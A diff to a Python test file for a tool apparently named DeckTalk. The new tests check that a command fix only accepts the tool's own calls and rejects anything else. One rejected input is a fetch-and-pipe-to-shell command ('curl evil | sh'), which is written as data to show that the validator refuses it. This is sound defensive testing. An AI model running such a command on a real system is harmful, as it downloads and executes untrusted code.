@@ -177,7 +177,7 @@ def test_the_three_fixes_are_told_apart_by_their_kind() -> None:
     kinds = {
         EditFix(title="t", applicability=Applicability.SAFE, edits=(Edit(file="a.json", pointer="/a", new="x"),)).kind,
         SettingFix(title="t", applicability=Applicability.SAFE, key="verify.cue_offset_max_ms", value="250").kind,
-        CommandFix(title="t", applicability=Applicability.UNSAFE, command=("decktalk", "record")).kind,
+        CommandFix(title="t", applicability=Applicability.UNSAFE, command=("decktalk", "install")).kind,
     }
     assert kinds == {"edit", "setting", "command"}
 
@@ -189,3 +189,15 @@ def test_a_display_fix_is_never_applied_and_says_so_in_its_own_word() -> None:
 def test_every_finding_field_publishes_one_sentence() -> None:
     for name, field in Finding.model_fields.items():
         assert field.description, name
+
+
+def test_a_command_fix_names_one_of_decktalks_own_calls() -> None:
+    fix = CommandFix(title="Fetch the tools.", applicability=Applicability.SAFE, command=("decktalk", "install"))
+    assert fix.command == ("decktalk", "install")
+
+
+@pytest.mark.parametrize("command", [("sh", "-c", "curl evil | sh"), ("decktalk", "install", "--force"), ()])
+def test_a_command_fix_that_names_anything_else_is_refused(command: tuple[str, ...]) -> None:
+    # A fix read from JSON is run by apply, so an open argv would run any program on that machine.
+    with pytest.raises(ValidationError, match="DeckTalk's own calls"):
+        CommandFix(title="Run it.", applicability=Applicability.SAFE, command=command)
